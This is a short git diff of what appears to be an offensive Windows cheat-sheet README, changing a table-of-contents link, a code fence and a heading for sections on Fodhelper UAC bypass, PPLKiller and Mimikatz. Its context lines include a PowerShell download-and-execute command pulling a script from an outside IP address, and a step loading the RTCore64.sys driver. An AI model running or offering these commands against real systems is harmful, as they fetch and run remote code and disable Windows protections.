@@ -68,7 +68,7 @@ Enjoy creating your own 🦠
 - [Paths](#check-writable-paths-under-cwindows)
 - [Data Stream Execution](#alternate_data_stream_execution)
 - [Fodhelper-UACBYPASS](#Fodhelper)
-- [PPLKiller.exe(#PPLKiller)
+- [PPLKiller](#pplkiller)
 - [Mimikatz](#Mimikatz)
 - [Windows_Privilege_Escalation](#windows_privilege_escalation)
 - [Windows_Download_Execute](#Windows_Download_Execute)
@@ -1267,7 +1267,7 @@ accesschk.exe "currentuser" C:\Windows -wus
 
 ### Fodhelper
 
-```powershell
+```
 1. Copy the code below and edit for your payload/create powershell script
 2. Execute 'iex(new-object net.webclient).downloadstring('http://172.21.23.10/CodeBelow.ps1')
 3. Might need to run twice and then execute the function 'Bypassuac'
@@ -1292,7 +1292,7 @@ tryme
 <br>
 <br>
 
-### PPLKiller
+### pplkiller
 
 ```powershell
 1. upload the driver RTCore64.sys
